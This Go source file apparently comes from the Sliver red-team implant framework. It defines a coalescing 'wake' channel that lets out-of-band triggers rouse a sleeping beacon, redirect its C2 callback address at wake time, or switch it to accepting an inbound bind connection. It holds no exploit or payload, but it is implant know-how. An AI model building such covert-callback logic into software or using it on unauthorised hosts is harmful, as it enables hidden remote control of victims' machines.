package transports

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	------------------------------------------------------------------------

	Wake hook: a tiny package-level signal that lets out-of-band
	transports (currently triggerwake; future: anything that can wake
	a sleeping beacon) short-circuit the beacon main loop's sleep
	between check-ins.

	Design: a single coalescing channel (buffer of 1). WakeNow() is
	non-blocking — multiple concurrent wakes collapse to a single
	signal. The runner's beacon select reads from WakeChannel()
	alongside its own internal shortCircuit and the standard
	time.After branch.

	The channel carries a WakeInfo struct with:
	  - TransportHint: preferred C2 scheme ("mtls", "wg", "http", "dns")
	  - CallbackURL:   optional dynamic callback address as a full C2 URL
	                    (e.g. "mtls://10.0.0.5:8888"). When set, the runner
	                    passes this to StartConnectionLoop as a temporary C2
	                    override, allowing the operator to specify the callback
	                    target at wake time rather than at build time.
	  - BindMode:      when true, the runner should NOT dial out. Instead it
	                    accepts a connection on BindListener and establishes
	                    a session over the inbound connection (bind transport).
	  - BindListener:  the already-opened TCP listener. The triggerwake
	                    handler opens it (so it can report the actual port
	                    back to the operator), then hands it here.

	An empty TransportHint means "try all transports in the configured
	order". An empty CallbackURL means "use the baked-in C2 list".
	For beacon wake (short-circuit sleep), both fields are typically
	empty/ignored.

	When the implant is built without any wake-capable transport (the
	template directive guards the triggerwake import), the channel
	exists but never gets a sender; the runner's select harmlessly
	ignores its branch.
*/

import "net"

// WakeInfo carries the operator's instructions from a wake trigger
// to the runner loop. Sent over the wake channel.
type WakeInfo struct {
	// TransportHint is the preferred C2 transport scheme (e.g. "mtls",
	// "wg", "http", "dns"). Empty means "try all in configured order".
	TransportHint string

	// CallbackURL is an optional dynamic callback address as a full
	// C2 URL (e.g. "mtls://10.0.0.5:8888"). When non-empty, the runner
	// passes this to StartConnectionLoop as a temporary C2 override,
	// bypassing the baked-in C2 list. Protected by the trigger packet's
	// HMAC — only an operator with the shared secret can set this.
	CallbackURL string

	// BindMode, when true, indicates the wake was triggered by a
	// "bind" intent. The runner should NOT call StartConnectionLoop.
	// Instead, it should accept a connection on BindListener and
	// establish a session using the bind transport.
	BindMode bool

	// BindListener is the already-opened TCP/KCP listener for bind mode.
	// The triggerwake handler opens it (to determine and report the
	// actual port), then passes ownership here. The runner accepts
	// one connection, negotiates yamux, and enters sessionMainLoop.
	// Non-nil only when BindMode is true. The runner is responsible
	// for closing it.
	BindListener net.Listener

	// BindSecret is the shared HMAC secret used for the bind auth
	// handshake. Copied from the triggerwake Config.Secret so the
	// runner can perform the HMAC challenge-response and derive the
	// session encryption key.
	BindSecret []byte
}

var wakeNow = make(chan WakeInfo, 1)

// WakeNow signals the beacon/session loop to wake up with the given
// info. Safe to call from any goroutine. Non-blocking — if a wake
// is already pending, the new call is silently coalesced.
func WakeNow(info WakeInfo) {
	select {
	case wakeNow <- info:
	default:
		// already signaled; coalesce.
	}
}

// WakeNowChan returns the write end of the wake channel for callers
// that need select-based send semantics (e.g., detecting a full channel
// to clean up resources like bind listeners). Most callers should use
// WakeNow() instead.
func WakeNowChan() chan<- WakeInfo {
	return wakeNow
}

// WakeChannel returns the read end of the wake signal. The beacon
// main loop's select uses this to be roused early. For trigger
// implants, the received WakeInfo carries transport preference and
// optional callback override. Returned as <-chan to discourage
// accidental sends from other call sites — use WakeNow() for that.
func WakeChannel() <-chan WakeInfo {
	return wakeNow
}

// ResetWake drains any pending wake signal so the channel can
// receive a fresh one. Called by the trigger-implant loop in
// runner.go after a session ends, before blocking on WakeChannel()
// again. Safe to call when no signal is pending.
func ResetWake() {
	select {
	case <-wakeNow:
	default:
	}
}
